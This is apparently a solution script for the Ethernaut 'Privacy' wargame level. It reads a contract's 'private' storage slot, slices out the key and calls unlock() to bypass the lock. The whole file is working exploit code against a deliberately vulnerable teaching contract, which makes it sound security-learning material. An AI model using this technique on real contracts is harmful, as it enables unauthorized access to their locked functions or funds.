import {ethers} from "hardhat"
import dotenv from 'dotenv'
import {Elevator} from "../typechain-types";

dotenv.config()

async function main() {
    const target = await ethers.getContractAt('Privacy', process.env.TARGET_ADDRESS_13!)

    /*
    variable name -> slot:
        locked -> 0
        ID     -> 1
        flattening + denomination + awkwardness -> 2
        data[0] -> 3
        data[1] -> 4
        data[2] -> 5
     */

    const slotValue = await ethers.provider.getStorage(target.target, 5)
    const key = ethers.dataSlice(slotValue, 0, 16)

    await target.unlock(key)
    console.log(await target.locked())
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
    console.error(error);
    process.exitCode = 1;
});
